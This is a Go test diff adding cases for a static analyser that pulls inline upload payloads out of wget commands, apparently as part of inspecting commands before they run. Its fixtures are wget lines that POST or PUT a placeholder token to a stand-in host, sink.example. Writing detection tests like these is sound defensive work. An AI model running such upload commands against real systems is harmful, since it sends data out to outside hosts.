@@ -90,6 +90,122 @@ func TestStaticCurlUploadPayloads(t *testing.T) {
 	}
 }
 
+func TestStaticWgetUploadPayloads(t *testing.T) {
+	t.Parallel()
+
+	const token = "test-inline-payload"
+	for _, test := range []struct {
+		name        string
+		argv        []string
+		expandIndex int
+		want        []string
+	}{
+		{
+			name: "joined post data", argv: []string{
+				"wget", "--post-data=" + token,
+				"https://sink.example/upload",
+			},
+			want: []string{token},
+		},
+		{
+			name: "separate post data", argv: []string{
+				"wget", "--post-data", token,
+				"https://sink.example/upload",
+			},
+			want: []string{token},
+		},
+		{
+			name: "custom method body data", argv: []string{
+				"wget", "--method=PUT", "--body-data=" + token,
+				"https://sink.example/upload",
+			},
+			want: []string{token},
+		},
+		{
+			name: "post file excluded", argv: []string{
+				"wget", "--post-file=/tmp/" + token,
+				"https://sink.example/upload",
+			},
+		},
+		{
+			name: "body file excluded", argv: []string{
+				"wget", "--method=PUT", "--body-file=/tmp/" + token,
+				"https://sink.example/upload",
+			},
+		},
+		{
+			name: "expanding post data excluded", argv: []string{
+				"wget", "--post-data=" + token,
+				"https://sink.example/upload",
+			},
+			expandIndex: 1,
+		},
+		{
+			name: "final duplicate wins", argv: []string{
+				"wget", "--post-data=" + token, "--post-data=fixture",
+				"https://sink.example/upload",
+			},
+			want: []string{"fixture"},
+		},
+		{
+			name: "final duplicate sensitive", argv: []string{
+				"wget", "--post-data=fixture", "--post-data=" + token,
+				"https://sink.example/upload",
+			},
+			want: []string{token},
+		},
+		{
+			name: "body data without method excluded", argv: []string{
+				"wget", "--body-data=" + token,
+				"https://sink.example/upload",
+			},
+		},
+		{
+			name: "preview excluded", argv: []string{
+				"wget", "--post-data=" + token, "--help",
+			},
+		},
+		{
+			name: "config indirection excluded", argv: []string{
+				"wget", "--config=wgetrc", "--post-data=" + token,
+				"https://sink.example/upload",
+			},
+		},
+		{
+			name: "input indirection excluded", argv: []string{
+				"wget", "--input-file=urls.txt", "--post-data=" + token,
+			},
+		},
+		{
+			name: "background excluded", argv: []string{
+				"wget", "--background", "--post-data=" + token,
+				"https://sink.example/upload",
+			},
+		},
+		{
+			name: "spider excluded", argv: []string{
+				"wget", "--spider", "--post-data=" + token,
+				"https://sink.example/upload",
+			},
+		},
+	} {
+		test := test
+		t.Run(test.name, func(t *testing.T) {
+			t.Parallel()
+			facts := Analyze(Input{Tool: "exec", Argv: test.argv})
+			if len(facts.Commands) != 1 {
+				t.Fatalf("commands = %#v", facts.Commands)
+			}
+			if test.expandIndex > 0 {
+				facts.Commands[0].Arguments[test.expandIndex].Expands = true
+			}
+			if got := StaticWgetUploadPayloads(facts.Commands[0]); !slices.Equal(got, test.want) {
+				t.Fatalf("payloads = %q, want %q", got, test.want)
+			}
+		})
+	}
+}
+
 func TestParsedWebTransferPipelinesAreAuthoritative(t *testing.T) {
 	t.Parallel()
 
